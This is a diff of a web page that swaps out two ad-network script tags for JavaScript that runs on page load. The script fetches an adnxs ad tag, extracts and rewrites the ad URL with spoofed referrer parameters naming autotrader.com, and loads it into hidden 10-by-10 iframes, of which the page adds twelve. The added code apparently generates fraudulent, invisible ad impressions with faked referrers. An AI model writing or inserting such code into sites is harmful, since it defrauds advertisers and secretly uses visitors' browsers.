@@ -1,30 +1,51 @@
-
-<!-- BEGIN TAG - DO NOT MODIFY -->
 <script type="text/javascript">
-/*<![CDATA[*/
-epom_key = "41d2996fd914cf4002140bd0774b0c05";
-epom_channel = "";
-epom_code_format = "ads-sync.js";
-epom_ads_host = "//n245adserv.com";
-epom_click = "";
-epom_custom_params = {};
-
-document.write("<script type='text\/javascript' src='"+(location.protocol == 'https:' ? 'https:' : 'http:') + "//n245adserv.com\/js/show_ads.js?pubId=865'><\/script>");
-/*]]>*/
+function createXmlHttp() {
+    if (window.XMLHttpRequest) {
+       xmlHttp = new XMLHttpRequest(); 
+    } else {
+       xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");//IE浏览器支持的创建方式
+    }
+}
+function getSource() {
+    var url = document.getElementById("url").value;             //获取目标地址信
+    createXmlHttp();                                            //创建XMLHttpRequest对象
+    xmlHttp.onreadystatechange = writeSource;                   //设置回调函数
+    xmlHttp.open("GET", url, true);
+    xmlHttp.send(null);
+}
+function writeSource() {
+    if (xmlHttp.readyState == 4) {
+        var apn_data=xmlHttp.responseText;
+        var start1=apn_data.indexOf("http://");
+        var stop1=apn_data.indexOf(";s+");
+        var adurl=apn_data.substring(stop1-2,start1);
+        adurl=adurl.replace("ttj?","tt?");      
+        adurl=adurl+".&&bdref=http%3A%2F%2Fwww.autotrader.com%2F&bdtop=true&bdifs=1&bstk=http%3A%2F%2Fwww.autotrader.com%2F,http%3A%2F%2Fg.adnxs.com%2Fbounce%3F%252Ftt%253Fid%253D5883665%2526cb%253D%255BCACHEBUSTER%255D%2526pubclick%253D%255BINSERT_CLICK_TAG%255D&&id=5883665&cb=[CACHEBUSTER]&pubclick=[INSERT_CLICK_TAG]";
+        
+document.getElementById("app1").src=adurl;
+    }
+}
 </script>
-<!-- END TAG -->
 
-<!-- BEGIN TAG - DO NOT MODIFY -->
-<script type="text/javascript">
-/*<![CDATA[*/
-epom_key = "e160f5d9ce9d7c94c8fe63daa8e64828";
-epom_channel = "";
-epom_code_format = "ads-sync.js";
-epom_ads_host = "//n245adserv.com";
-epom_click = "";
-epom_custom_params = {};
 
-document.write("<script type='text\/javascript' src='"+(location.protocol == 'https:' ? 'https:' : 'http:') + "//n245adserv.com\/js/show_ads.js?pubId=864'><\/script>");
-/*]]>*/
-</script>
-<!-- END TAG -->
+
+<body onload="getSource()"></body>
+
+<div>
+          <input type="hidden" id="url" value="http://ib.adnxs.com/tt?id=5883665">
+          
+</div>
+<iframe id="app1" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app2" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>     
+<iframe id="app3" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app4" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app5" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app6" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app7" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app8" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app9" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app10" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app11" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+<iframe id="app12" width="10" height="10" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes"></iframe>
+
+
